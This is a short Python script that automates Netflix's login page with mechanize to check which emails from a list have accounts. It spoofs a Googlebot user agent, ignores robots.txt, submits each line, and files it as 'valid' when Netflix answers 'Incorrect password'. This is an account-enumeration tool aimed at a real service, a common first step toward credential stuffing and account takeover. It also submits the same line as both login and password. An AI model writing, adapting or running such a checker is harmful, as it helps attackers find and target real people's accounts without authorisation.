import os
import time
import random
import mechanize



# CHECK IF FILE EXIST
def netf():
    path = 'Result/Netflix_Validator/'
    if os.path.exists(path) and os.path.exists(f'{path}Netflix_Invalid.txt') :
           os.remove(f'{path}Netflix_Invalid.txt')
           os.remove(f'{path}Netflix_Valid.txt')
           return
    else:
        if os.path.exists(path):
            pass
        else :     
            os.makedirs(path)





# START CHECKING

def valid(count,pathx,rm):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    Headears = [
    ('User-Agent','Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')]
    browser.addheaders= [random.choice(Headears)]
    browser.open('https://www.netflix.com/login')
    browser.select_form(nr=0)

    medd = (pathx +'\\'+ rm)
    with open(medd , 'r+') as fe:
        tr = fe.readlines()

    browser.form['userLoginId'] =  tr[count]
    browser.form['password'] =  tr[count]
    

    sub = browser.submit()
    tam = (sub.get_data())
    rzlt = str(tam)


    



    if count != -1  :
        if 'class="ui-message-contents"><b>Incorrect password.' in rzlt :
            with open('Result/Netflix_Validator/Netflix_Valid.txt','a') as gmal:
                gmal.write(tr[count])
                pass
            print( '   ',tr[count].strip() ,'\033[1;32m    =====>>>  Valid email\033[1;0m')


        else : 
            print ('   ', tr[count].strip() ,'\033[1;31m   =====>>>  Invalid email\033[1;0m')
            with open('Result/Netflix_Validator/Netflix_Invalid.txt','a') as Netflix:
                Netflix.write(tr[count])
                pass



